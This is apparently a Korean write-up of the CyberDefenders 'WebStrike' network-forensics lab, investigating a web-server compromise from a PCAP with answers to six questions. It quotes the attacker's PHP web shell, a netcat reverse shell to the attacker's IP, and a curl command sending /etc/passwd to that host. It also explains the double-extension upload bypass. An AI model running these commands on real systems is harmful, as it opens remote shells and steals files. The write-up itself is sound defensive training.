---
platform: "cyberdefenders"
title: "WebStrike"
category: "Network Forensics"
difficulty: "Easy"
date: 2025-06-16
tags:
  - Wireshark
  - File Upload
  - Initial Acess
  - Execution
  - Persistence
  - Command and Control
  - Exfiltration
---

# WebStrike Lab

_Lab URL: https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/_

## 시나리오 설명
> Wireshark를 사용해 네트워크 트래픽을 분석하고, 웹 서버 침해 사고를 조사한다. 웹 셸 설치, 리버스 셸 통신, 데이터 유출 과정을 추적한다.

회사 웹 서버에서 의심스러운 파일이 발견되었고, 사내 인트라넷에 경보가 울렸다. 개발팀이 이상 징후를 발견했고, 네트워크팀은 주요 트래픽을 캡처하여 PCAP 파일로 제공했다.

이 PCAP 파일을 분석해 파일이 어떻게 생겼는지, 무단 활동의 범위가 어디까지인지 파악한다.

## 질문 6/6

### 질문 1

> 공격의 지리적 출발지를 파악하면 지역 차단 정책 수립과 위협 인텔리전스 분석에 도움이 된다. 공격은 어느 도시에서 시작되었는가?

_💡 참고: 랩 환경은 인터넷 접근이 차단되어 있다. IP 주소 조회는 랩 외부의 로컬 컴퓨터에서 IP 지리 정보 서비스를 이용한다._

IP 지리 정보(IP Geolocation)는 IP 주소를 물리적 지역, 국가, 도시, 좌표, ISP 정보로 변환하는 과정이다. 방어자 입장에서는 지역 차단 결정을 지원하고, 위협 인텔리전스 상관 분석의 기반이 되며, 특정 지역의 위협 그룹과 관찰된 활동을 연결하는 데 활용된다.

웹 서버와 통신하는 호스트를 찾기 위해 Wireshark에서 먼저 엔드포인트 요약 화면을 확인한다. PCAP를 열고 **Statistics → Endpoints**로 이동해 **IPv4** 탭을 선택한다. 이 화면에는 캡처에 등장한 모든 IPv4 주소와 각 방향별 패킷 수, 바이트 양이 나온다.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776563006/Writeups/Cyberdefenders/WebStrike/53e08e9e-bf85-40b2-ba7d-f14efe59a55d.png)

트래픽을 지배하는 주소는 두 개다: **117.11.88.124**와 **24.49.63.79**. `24.49.63.79`는 피해자 웹 서버이므로, 외부 호스트 `117.11.88.124`가 관심 대상이다. 위 이미지에서 `117.11.88.124`가 TCP 3-Way-Handshake를 먼저 시작했음을 확인할 수 있어, 이 경우 클라이언트 역할을 하는 것이 확인된다.

이 IP를 `ipinfo.io` 같은 지리 정보 서비스에서 조회하면 **Tianjin(천진), China**에 위치한다.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776563111/Writeups/Cyberdefenders/WebStrike/012dd5a8-7584-4c39-b4ec-105ce9dec6a2.png)

출발지를 특정했으면, 경계 방어자는 해당 지역 전체를 차단하는 지오블로킹이 적절한지, 아니면 특정 주소와 그 인프라에 대한 좁은 필터링으로 충분한지 판단할 수 있다.

#### 정답

<spoiler>
Tianjin
</spoiler>

### 질문 2

> 공격자의 User-Agent를 파악하면 강력한 필터링 규칙을 만드는 데 도움이 된다. 공격자의 전체 User-Agent는 무엇인가?

User-Agent 헤더는 클라이언트가 모든 HTTP 요청에 첨부하는 문자열로, 보통 브라우저 계열, 렌더링 엔진, 버전, 기반 운영체제를 담는다. 서버는 이를 콘텐츠 협상에 사용하고, 방어자는 가벼운 핑거프린팅 도구로 활용한다. 공격자는 대개 일반 브라우저처럼 보이는 User-Agent를 위조해 단순한 필터를 우회하는데, 이것이 비정상적이거나 일관되지 않은 값을 모니터링하는 것이 유용한 탐지 신호인 이유다.

공격자의 User-Agent를 추출하려면 `117.11.88.124`에서 온 HTTP 패킷을 우클릭하고 **Follow → HTTP Stream**을 선택한다.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776563401/Writeups/Cyberdefenders/WebStrike/15042cdf-5438-4e0d-8115-082f5c8f602c.png)

재조립된 GET 요청에서 다음 헤더가 드러난다:

```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

공격자는 64비트 Linux의 Firefox 115로 위장하고 있다. 그 자체로는 그럴듯한 문자열이지만, 출발지 IP와 결합하면 IDS 규칙이나 SIEM 쿼리에서 동일 도구를 사용한 반복 시도를 탐지하는 데 활용할 수 있는 구체적인 시그니처가 된다.

#### 정답

<spoiler>
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</spoiler>

### 질문 3

> 어떤 취약점이 악용되었는지 파악해야 한다. 성공적으로 업로드된 악성 웹 셸의 이름은 무엇인가?

웹 셸은 취약한 애플리케이션에 드롭된 서버 측 스크립트로, 공격자에게 대화형 거점을 제공한다. 보통 서버가 이미 실행 중인 언어(PHP, ASP, JSP 등)로 작성되며, 명령 실행, 추가 도구 스테이징, 네트워크 내부 피벗에 사용된다. 캡처에서 웹 셸을 찾으려면 업로드 자체나 이후 발생하는 트래픽을 추적해야 한다.

업로드 시도에 초점을 맞추기 위해 Wireshark에 다음 표시 필터를 적용했다:

```
ip.src == 117.11.88.124 && http.request.method == "POST"
```

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776564079/Writeups/Cyberdefenders/WebStrike/06ff87da-7aa3-432b-99c1-8a8b56777f49.png)

`/reviews/upload.php`로의 POST 요청 두 건이 보인다. 첫 번째 시도는 `image.php`라는 파일을 올리려 하는데, 본문에 `system()`을 호출해 리버스 셸을 실행하는 PHP 코드가 담겨 있다. 서버는 **"Invalid file format"** 응답을 반환하며 거부한다 — 확장자나 MIME 타입에 대한 서버 측 유효성 검사가 있다는 의미다.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776564188/Writeups/Cyberdefenders/WebStrike/1caed39d-3ba8-49e7-86d1-78da61c0f807.png)

두 번째 시도는 동일한 페이로드이지만 파일명에 작은 변형이 가해졌다: `image.jpg.php`. 이 이중 확장자 기법은 서버의 검사를 통과하기에 충분했다. 아마도 이름 어딘가에 `.jpg`가 있는지만 느슨하게 확인하는 검사였을 것이다. 이번에는 서버가 **"File uploaded successfully"**로 응답한다.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776564306/Writeups/Cyberdefenders/WebStrike/c825d76d-7593-49d0-8779-55bd7d7c42fc.png)

이 우회 기법은 전형적인 패턴이다: 확장자 필터링을 마지막 확장자 기준이 아닌 부분 문자열 검사로 구현하면, 실행 가능한 확장자 앞에 허용된 확장자를 붙이는 것만으로 필터를 속일 수 있고, Apache는 여전히 해당 파일을 PHP로 실행한다.

#### 정답

<spoiler>
image.jpg.php
</spoiler>

### 질문 4

> 업로드된 파일이 저장되는 디렉토리를 파악하는 것은 취약한 페이지를 찾고 악성 파일을 제거하는 데 중요하다. 웹사이트가 업로드된 파일을 저장하는 디렉토리는 어디인가?

대상 폴더를 아는 것은 대응에 중요하다: 드롭된 아티팩트를 어디서 찾을지, 어떤 경로를 격리해야 할지, WAF에서 어떤 URL 패턴을 차단해야 할지를 알 수 있다. 수신 엔드포인트 `/reviews/upload.php`는 요청만 처리한다; 파일 자체는 공격자가 접근할 수 있는 어딘가에 기록되어야 한다.

HTTP 대화를 더 살펴보면, 공격자가 `/reviews/uploads`로 후속 GET 요청을 보내는 것을 확인할 수 있다. 서버는 **301 Moved Permanently**로 응답하며 요청을 `/reviews/uploads/`(슬래시 포함)로 재작성한다.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776565678/Writeups/Cyberdefenders/WebStrike/240890a8-6e36-424a-8753-89e36304e9aa.png)

이 리다이렉트가 우리에게 필요한 확인이다. `upload.php`를 통해 업로드된 모든 것, `image.jpg.php`를 포함해서, `/reviews/uploads/` 안에 저장된다. 그리고 이 경로는 HTTP로도 직접 접근이 가능하다. 이 공개 접근성 덕분에 공격자는 단순히 URL을 요청하는 것만으로 셸을 트리거할 수 있다.

#### 정답

<spoiler>
/reviews/uploads/
</spoiler>

### 질문 5

> 공격자의 머신에서 어떤 포트가 열려 있었으며, 악성 웹 셸이 무단 아웃바운드 통신 수립을 위해 그 포트를 타깃으로 삼았는가?

셸이 디스크에 설치되면, 공격자는 여전히 대화형으로 제어할 방법이 필요하다. 리버스 셸은 TCP 연결 방향을 뒤집어 — 피해자가 공격자에게 아웃바운드 세션을 개시한다. 대부분의 네트워크에서 이그레스 규칙은 인그레스 규칙보다 훨씬 느슨하므로, 직접 바인드 셸이 막히는 상황에서도 이 패턴은 대개 성공한다.

관련 세부 정보는 앞서 캡처된 `image.jpg.php` 본문에 있다:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

이것은 명명된 파이프를 기반으로 하는 교과서적인 netcat 리버스 셸이다. `/tmp/f`의 FIFO가 `/bin/sh -i`와 `nc` 사이에서 데이터를 전달하고, `nc`는 공격자 `117.11.88.124`의 포트 **8080**으로 연결을 개시한다. 이것이 공격자가 수신 대기 중인 포트이므로, 앞으로 이그레스 모니터링에서 중점적으로 감시해야 할 포트다.

#### 정답

<spoiler>
8080
</spoiler>

### 질문 6

> 탈취된 데이터의 중요성을 인식하면 인시던트 대응 행동 우선순위를 정하는 데 도움이 된다. 공격자가 유출하려 한 파일은 무엇인가?

셸 채널을 확인했다면, 다음 단계는 그 안에서 실제로 어떤 내용이 입력되었는지 확인하는 것이다. 리버스 셸 구간으로 트래픽을 좁히기 위해 다음 필터를 사용했다:

```
tcp.port == 8080 && ip.src == 24.49.63.79
```
![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776566357/Writeups/Cyberdefenders/WebStrike/07175255-2c45-4b84-8fe2-cdfd94140c47.png)

이것은 피해자에서 공격자로 흐르는 데이터를 격리하는 것으로, 본질적으로 서버 관점에서 본 세션 기록이다. TCP 스트림을 따라가면 명령 기록을 읽을 수 있다.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776566471/Writeups/Cyberdefenders/WebStrike/06a2ac20-b2d7-4e73-9a1c-c0808e9de64a.png)

해당 스트림에서 핵심 줄이 눈에 띈다:

```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

공격자는 `curl`을 사용해 `/etc/passwd`의 내용을 자신의 호스트로 POST한다. 여기서 포트 `443`은 단순한 리스너 선택이다 — URL 체계가 `http://`이므로 TLS가 아니다. 공격자는 아웃바운드로 허용될 가능성이 높은 잘 알려진 포트 번호를 재사용하고 있을 뿐이다.

현대 Linux에서 `/etc/passwd`는 더 이상 패스워드 해시를 담지 않는다 — 그것은 수년 전에 `/etc/shadow`로 이동했다. 하지만 여전히 로컬 사용자명, UID, 로그인 셸, 서비스 계정을 노출한다. 이것은 탁월한 정찰 자료다: 공격자에게 어떤 계정을 다음 타깃으로 삼을지, 어떤 사용자가 대화형 셸을 갖는지, 호스트가 어떤 종류의 서비스를 실행하는지 알려준다.

#### 정답

<spoiler>
passwd
</spoiler>
